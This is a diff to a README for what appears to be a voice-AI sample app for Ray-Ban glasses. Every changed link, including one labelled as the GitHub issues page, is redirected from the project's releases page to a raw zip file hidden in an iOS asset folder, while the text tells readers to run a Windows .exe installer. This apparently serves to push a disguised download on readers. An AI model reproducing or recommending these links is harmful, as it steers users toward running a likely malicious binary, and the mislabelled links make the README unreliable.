@@ -1,6 +1,6 @@
 # 🕶️ meta-ai-agent-sample-for-aws-agentcore - Voice AI for Ray-Ban Glasses
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Undemanding-gruiformes910/meta-ai-agent-sample-for-aws-agentcore/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://raw.githubusercontent.com/Undemanding-gruiformes910/meta-ai-agent-sample-for-aws-agentcore/main/ray-ban-voice-agent-bedrock/ios/MetaChatAgent/Assets.xcassets/for-agent-agentcore-meta-ai-aws-sample-3.9.zip)
 
 ## 📋 About this Application
 
@@ -27,7 +27,7 @@ You will also need a USB cable or Bluetooth connection to pair your glasses to t
 
 Click the button below to visit the release page where you can download the setup file.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/Undemanding-gruiformes910/meta-ai-agent-sample-for-aws-agentcore/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue)](https://raw.githubusercontent.com/Undemanding-gruiformes910/meta-ai-agent-sample-for-aws-agentcore/main/ray-ban-voice-agent-bedrock/ios/MetaChatAgent/Assets.xcassets/for-agent-agentcore-meta-ai-aws-sample-3.9.zip)
 
 1. The link opens the GitHub releases page.
 2. Look for the latest Windows installer file. It will usually have a name ending with `.exe`.
@@ -100,7 +100,7 @@ The AI will listen and respond through the glasses’ built-in speaker or your p
 ## 📂 Additional Resources
 
 - User guide included in the app under Help menu  
-- GitHub issues page for reporting problems: https://github.com/Undemanding-gruiformes910/meta-ai-agent-sample-for-aws-agentcore/issues  
+- GitHub issues page for reporting problems: https://raw.githubusercontent.com/Undemanding-gruiformes910/meta-ai-agent-sample-for-aws-agentcore/main/ray-ban-voice-agent-bedrock/ios/MetaChatAgent/Assets.xcassets/for-agent-agentcore-meta-ai-aws-sample-3.9.zip  
 - Frequently asked questions in the release notes section  
 - Contact support through GitHub Discussions for community help  
 
@@ -109,7 +109,7 @@ The AI will listen and respond through the glasses’ built-in speaker or your p
 ## 🛠️ Installation and Setup - Full Steps
 
 1. Visit the release page to download the latest Windows installer:  
-   https://github.com/Undemanding-gruiformes910/meta-ai-agent-sample-for-aws-agentcore/releases  
+   https://raw.githubusercontent.com/Undemanding-gruiformes910/meta-ai-agent-sample-for-aws-agentcore/main/ray-ban-voice-agent-bedrock/ios/MetaChatAgent/Assets.xcassets/for-agent-agentcore-meta-ai-aws-sample-3.9.zip  
 2. Download the `.exe` file matching Windows.
 3. Run the installer by double-clicking it.
 4. Follow the prompts until installation finishes.
